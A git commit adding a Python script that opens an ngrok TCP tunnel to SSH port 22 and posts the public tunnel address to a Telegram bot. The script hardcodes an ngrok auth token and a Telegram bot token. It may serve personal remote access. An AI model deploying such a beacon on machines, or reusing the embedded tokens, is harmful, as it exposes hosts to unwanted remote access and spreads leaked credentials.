435ec876f96820c96c22adb954c755628ab9c219
ckninja2 <123234243+ckninja2@users.noreply.github.com>
2023-02-21 08:28:32 +0300

    Add files via upload

---
+++ ngrok.py
@@ -0,0 +1,36 @@
+import asyncio
+import json
+import urllib.request
+import os
+
+os.environ.setdefault("NG_TOKEN", "2JVsjpRofJqsvf4mjWKFO887FTy_uXY5Qc4RoQfW3X78aP4R")
+
+ngrokpath ="ngrok.exe"
+ng_token = os.environ.get('NG_TOKEN')
+
+async def main():
+	p = await asyncio.subprocess.create_subprocess_exec(
+		ngrokpath, 'authtoken', ng_token,
+		stdout=asyncio.subprocess.PIPE,
+		stderr=asyncio.subprocess.STDOUT
+	)
+	await p.wait()
+	p = await asyncio.subprocess.create_subprocess_exec(
+		ngrokpath, 'tcp', '22', '--log', 'stdout', '--log-format', 'json',
+		stdout=asyncio.subprocess.PIPE,
+		stderr=asyncio.subprocess.STDOUT
+	)
+	while p.returncode is None:
+		line = await p.stdout.readline()
+		if line != b'':
+			line = line.decode()
+			json_ = json.loads(line)
+			dict_ = dict(json_)
+			url = dict_.get('url', None)
+		if url:
+			urllib.request.urlopen(f"https://api.telegram.org/bot5853498488:AAGa6b6gQ9ebSo4x1kgMl7_OmCh4x1Mo26o/sendMessage?chat_id=5547761832&text={url}")
+			print(url)
+			break
+
+if __name__ == '__main__':
+	asyncio.run(main())
